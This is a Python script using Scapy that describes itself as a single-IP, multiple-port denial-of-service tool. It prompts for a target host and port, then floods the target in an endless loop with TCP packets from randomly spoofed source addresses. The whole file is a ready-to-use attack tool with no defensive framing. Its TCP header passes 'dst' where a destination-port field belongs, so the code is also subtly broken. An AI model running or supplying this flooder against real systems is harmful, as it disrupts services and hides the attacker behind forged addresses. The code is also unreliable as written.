#!/usr/bin/env python3

import random
import sys

try:
    from scapy.all import *
except:
    sys.exit("[!] Script requires Scapy ")

def RandomIP():
    #
    random_addr = ""
    #
    for i in range(1,4):
        #
        value = random.randint(1,255)
        #
        random_addr += str(value)+'.'
        #
    random_addr = random_addr+str(random.randint(1,255))
    #
    return random_addr

def main():
    #
    print("<-- Single IP Multiple Port Denial of Service -->")
    #
    subject_host = input("[+] Enter the host IP-> ")
    #
    subject_port = int(input("[+] Enter the target port-> "))
    #
    packet_count = 0
    #
    print("*** Initiating Denial of Service ***")
    #
    while(True):
        #
        for p in range(1,65535):
            #
            sender = RandomIP()
            #
            IP_HEADER = IP(src=sender, dst=subject_host)
            #
            TCP_HEADER = TCP(sport=p, dst=subject_port)
            #
            pkt = IP_HEADER/TCP_HEADER
            #
            send(pkt,inter=.0001,verbose=False)
            #
            print("[*] Packet sent from %s:%i -> %s:%i | Packets Sent: %i " % (sender,p,subject_host,subject_port,packet_count))
            #
            packet_count += 1

if(__name__ == '__main__'):
    #
    main()
